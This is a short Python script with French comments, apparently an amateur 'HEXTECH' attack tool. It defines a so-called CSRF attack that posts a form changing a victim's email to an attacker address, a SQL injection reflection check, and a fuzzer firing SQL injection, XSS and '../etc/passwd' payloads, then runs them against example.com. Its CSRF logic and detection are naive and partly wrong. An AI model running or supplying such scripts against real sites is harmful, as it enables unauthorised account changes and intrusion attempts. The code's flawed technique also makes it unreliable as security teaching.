import requests
from termcolor import colored
import random
import time

# Liste de proxies à utiliser
PROXY_LIST = ['http://proxy1', 'http://proxy2', 'http://proxy3']

def get_random_proxy():
    return random.choice(PROXY_LIST)

def csrf_attack(url, victim_url):
    print(colored("[*] Tentative d'attaque CSRF en cours...", "yellow"))
    # Supposons que l'attaquant soumet un formulaire pour une action spécifique (par exemple, changer l'email ou envoyer de l'argent)
    csrf_token = "votre_token_csrf"  # Exemple, le vrai token CSRF doit être récupéré dynamiquement ou via l'interface de l'application
    data = {
        'csrf_token': csrf_token,
        'email': 'attacker@example.com',  # Valeur de l'attaquant ou autre action malveillante
    }
    try:
        # Envoi de la requête malveillante au victim_url
        response = requests.post(victim_url, data=data, timeout=10)
        if response.status_code == 200:
            print(colored("[+] CSRF attaque réussie ! L'email a été modifié.", "green"))
        else:
            print(colored("[-] CSRF attaque échouée.", "red"))
    except requests.exceptions.RequestException as e:
        print(colored(f"[!] Erreur lors de l'attaque CSRF : {e}", "red"))

def detect_vulnerability(url):
    print(colored("[🦠] Analyse de vulnérabilités🦠 en cours...", "yellow"))
    payload = "' OR '1'='1"  # Exemple de payload pour test
    try:
        response = requests.get(url, params={"test": payload}, timeout=10)
        if payload in response.text:
            print(colored("[HEXTECH] Vulnérabilité détectée avec le payload!", "green"))
            return True
        else:
            print(colored("[RAPPORT HEXTECH ☣️] Aucune vulnérabilité détectée.", "red"))
            return False
    except requests.exceptions.RequestException as e:
        print(colored(f"[!] Erreur lors de l'analyse : {e}", "red"))
        return False

def fuzzing_attack(url):
    print(colored("[*] Lancement de l'attaque de fuzzing...", "yellow"))
    fuzz_data = [
        "' OR 1=1 --", 
        "<script>alert('XSS')</script>", 
        "../etc/passwd", 
        "admin' OR 1=1 --"
    ]
    for data in fuzz_data:
        try:
            response = requests.get(url, params={"input": data}, timeout=10)
            print(f"Test de fuzzing avec : {data} - Statut : {response.status_code}")
            if response.status_code == 200:
                print(colored(f"[+] Fuzzing réussi avec : {data}", "green"))
            else:
                print(colored(f"[-] Fuzzing échoué avec : {data}", "red"))
        except requests.exceptions.RequestException as e:
            print(colored(f"[!] Erreur lors du fuzzing : {e}", "red"))

# Exemple d'utilisation de l'attaque CSRF
url_victime = "http://example.com/submit_form"  # URL du site vulnérable
csrf_attack(url_victime, url_victime)  # Effectuer l'attaque CSRF
fuzzing_attack(url_victime)  # Exécution de l'attaque Fuzzing pour tester la vulnérabilité
